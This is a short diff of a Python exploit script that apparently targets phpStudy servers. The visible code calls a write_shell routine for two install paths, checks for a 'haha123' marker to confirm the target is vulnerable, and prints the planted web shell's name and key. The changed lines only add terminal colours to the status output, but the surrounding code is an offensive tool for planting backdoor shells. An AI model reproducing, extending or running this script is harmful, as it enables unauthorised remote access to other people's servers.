@@ -43,7 +43,7 @@ def exp():
         requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
     write_shell(version_path='phpStudy')
     write_shell(version_path='PHPTutorial')
-    return f"[*] Shell_name={shell_name}.php, Key={key}"
+    return f"\033[33m[*] Shell_name={shell_name}.php, Key={key}\033[0m"
 
 
 if __name__=="__main__":
@@ -53,10 +53,10 @@ if __name__=="__main__":
     try:
         res = requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
         if res.status_code == 200 and res.text[:7] == "haha123":
-            print("[+] POC EXISTS.")
+            print("\033[32m[+] POC EXISTS.\033[0m")
             print(exp())
         else:
-            print("[-] POC NOT EXISTS.")
+            print("\033[31m[-] POC NOT EXISTS.\033[0m")
     except:
-        print("[!] ERROR!\n")
+        print("\033[41m[!] ERROR!\033[0m")
     
